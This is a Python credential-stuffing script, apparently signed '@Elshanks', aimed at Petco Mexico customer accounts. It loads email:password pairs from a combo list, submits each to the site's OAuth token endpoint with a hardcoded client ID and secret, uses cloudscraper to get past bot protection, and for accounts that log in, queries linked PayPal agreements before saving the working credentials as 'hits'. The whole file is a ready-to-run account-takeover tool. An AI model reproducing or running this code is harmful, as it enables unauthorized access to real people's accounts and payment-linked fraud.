import os, time, cloudscraper
from bs4 import BeautifulSoup as bs

#==================================================== [ VARIABLES GLOBALES ]
DOCUMENTO_HITS = 'combos.txt'
DOCUMENTO_COMBO = 'combos.txt'


#==================================================== [ INSTANCIA DE COLORES ]
NARANJA = "\033[38;5;214m"
VERDE = "\033[38;5;46m"
AMARILLO = "\033[38;5;226m"
ROJO = "\033[38;5;196m"
MORADO = "\033[38;5;129m"
AZUL = "\033[38;5;33m"
CYAN_CLARO = "\033[38;5;51m"
RESET = "\033[0m"

#==================================================== [ FUNCIONES ]
def logo():
    os.system("cls" if os.name == "nt" else "clear")
    logo = '''
██████╗ ███████╗████████╗ ██████╗ ██████╗     ██████╗  █████╗ ██╗   ██╗██████╗  █████╗ ██╗         ███████╗██╗██╗  ██╗███████╗██████╗ 
██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔═══██╗    ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██║         ██╔════╝██║╚██╗██╔╝██╔════╝██╔══██╗
██████╔╝█████╗     ██║   ██║     ██║   ██║    ██████╔╝███████║ ╚████╔╝ ██████╔╝███████║██║         █████╗  ██║ ╚███╔╝ █████╗  ██║  ██║
██╔═══╝ ██╔══╝     ██║   ██║     ██║   ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══██║██║         ██╔══╝  ██║ ██╔██╗ ██╔══╝  ██║  ██║
██║     ███████╗   ██║   ╚██████╗╚██████╔╝    ██║     ██║  ██║   ██║   ██║     ██║  ██║███████╗    ██║     ██║██╔╝ ██╗███████╗██████╔╝
╚═╝     ╚══════╝   ╚═╝    ╚═════╝ ╚═════╝     ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝  @Elshanks
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════ 
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════                                                                                                                                    
'''
    print(CYAN_CLARO + logo + RESET)

def print_console(text, borrar=False):
    print("\r" + " " * 80 + "\r", end='')
    print(text, end='\n' if not borrar else '', flush=True)

def guardar_linea(ruta_archivo, linea):
    directorio = os.path.dirname(ruta_archivo)
    
    if directorio:
        os.makedirs(directorio, exist_ok=True)
    
    with open(ruta_archivo, 'a', encoding='utf-8') as f:
        f.write(linea + '\n')

def obtener_lineas(documento):
    try:
        with open(documento, 'r', encoding='utf-8') as file:
            lineas = file.readlines()
        lineas = [linea.strip() for linea in lineas if linea.strip()]
        return lineas
    except Exception as e:
        print(ROJO + f"[!] Error al procesar el archivo {documento}: {e}")
        return []

def petco_capture(email, password):
    url_token = "https://www.petco.com.mx/authorizationserver/oauth/token"
    url_paypal = "https://www.petco.com.mx/petcows/v2/petco/users/current/paypalAgreements"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    
    payload = {
        "client_id": "onepagecheckout",
        "client_secret": "onepageclient",
        "grant_type": "password",
        "username": email,
        "password": password,
        "CSRFToken": ""
    }

    with cloudscraper.create_scraper() as session:
        session.headers.update(headers)
        try:
            response = session.post(url_token, data=payload)
            if "Bad credentials" in response.text:
                return "failed"
            elif "access_token" in response.text:
                access_token = f"Bearer {response.json()['access_token']}"
                session.headers.update({"Authorization": access_token})
                response = session.get(url_paypal)
                agreements = response.json().get("agreements", [])
                return agreements[0].get("email", "custom") if agreements else "custom"
            else:
                return "retry"
        except Exception as e:
            return "retry"

def main():
    combo = obtener_lineas(DOCUMENTO_COMBO)
    if combo == []:
        print(ROJO + "[!] Error: No hay lineas en el combo.")
        return
    
    for linea in combo:
        try:
            email, password = linea.split(":")
        except ValueError:
            print(MORADO + f'[INVALID] {linea}' + RESET)
            continue
    
        resultado = petco_capture(email, password)
        if '@' in resultado:
            print_console(VERDE + f"[SUCCESS] {linea}" + RESET)
            guardar_linea(DOCUMENTO_HITS, linea)
        elif resultado == 'custom':
            print_console(NARANJA + f"[CUSTOM] {linea}" + RESET)
        elif resultado == 'failed':
            print_console(ROJO + f"[FAILURE] {linea}" + RESET, borrar=True)
        else:
            combo.append(linea)


#==================================================== [ EJECUCION DEL SCRIPT ]
if __name__ == "__main__":
    logo()
    main()
